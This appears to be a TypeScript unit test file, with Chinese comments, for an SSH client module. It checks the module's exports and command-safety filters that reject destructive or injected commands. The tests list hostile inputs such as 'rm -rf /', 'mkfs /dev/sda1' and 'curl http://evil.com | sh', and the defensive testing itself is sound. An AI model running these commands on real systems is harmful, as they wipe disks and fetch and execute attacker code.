/**
 * SSH Client 单元测试 — 模块加载验证、安全防护逻辑。
 *
 * 注意:
 *   - SSHConnectionConfig / SSHExecResult 等为 TypeScript 类型（编译时擦除），
 *     无法通过 require() 在运行时断言。
 *   - SSHClient 依赖 ssh2 库，仅验证模块加载和公共 API 契约。
 */
import { describe, expect, test } from "bun:test";

// ── 模块加载验证 ──────────────────────────────────────────

describe("SSHClient 模块契约", () => {
  test("ssh/client 模块导出 SSHClient 类和 createSSHClient 工厂", () => {
    const mod = require("@/server/ssh/client");
    expect(mod.SSHClient).toBeDefined();
    expect(mod.createSSHClient).toBeDefined();
    expect(typeof mod.createSSHClient).toBe("function");
  });

  test("ssh/client 模块导出 sshConnectionPool 单例", () => {
    const mod = require("@/server/ssh/client");
    expect(mod.sshConnectionPool).toBeDefined();
  });

  test("ssh/types 模块可正常加载（类型声明编译时使用，运行时为空）", () => {
    // types.ts 仅包含 TypeScript interface/type，编译后被擦除
    // 验证模块本身能正常加载即可
    expect(() => require("@/server/ssh/types")).not.toThrow();
  });
});

// ── SSH 安全防护 ──────────────────────────────────────────

describe("SSH 安全防护", () => {
  const { sanitizeSSHCommand, checkSSHDenylist, makeSSHCommandSafe } = require("@/server/ssh/safety");

  test("sanitizeSSHCommand 拒绝包含 shell 元字符的命令", () => {
    // 合法命令通过
    expect(() => sanitizeSSHCommand("ls -la /tmp")).not.toThrow();
    expect(() => sanitizeSSHCommand("cat README.md")).not.toThrow();

    // 包含危险元字符的命令被拒绝
    const dangerous = ["ls;rm -rf /", "cat | sh exploit.sh", "echo $(whoami)", "curl http://evil | bash"];
    for (const cmd of dangerous) {
      expect(() => sanitizeSSHCommand(cmd)).toThrow();
    }
  });

  test("checkSSHDenylist 拒绝危险命令模式", () => {
    // 正常命令通过
    expect(checkSSHDenylist("ls -la")).toBeNull();
    expect(checkSSHDenylist("cat file.txt")).toBeNull();

    // 危险模式被拒绝
    expect(checkSSHDenylist("rm -rf /")).not.toBeNull();
    expect(checkSSHDenylist("mkfs /dev/sda1")).not.toBeNull();
    expect(checkSSHDenylist("curl http://evil.com | sh")).not.toBeNull();
  });

  test("makeSSHCommandSafe 一步完成 sanitize + denylist", () => {
    // 正常命令通过
    expect(() => makeSSHCommandSafe("ls -la /tmp")).not.toThrow();

    // 包含元字符被 sanitize 拒绝
    expect(() => makeSSHCommandSafe("ls;rm -rf /")).toThrow();

    // 通过 sanitize 但被 denylist 拒绝
    expect(() => makeSSHCommandSafe("rm -rf /")).toThrow();
  });
});
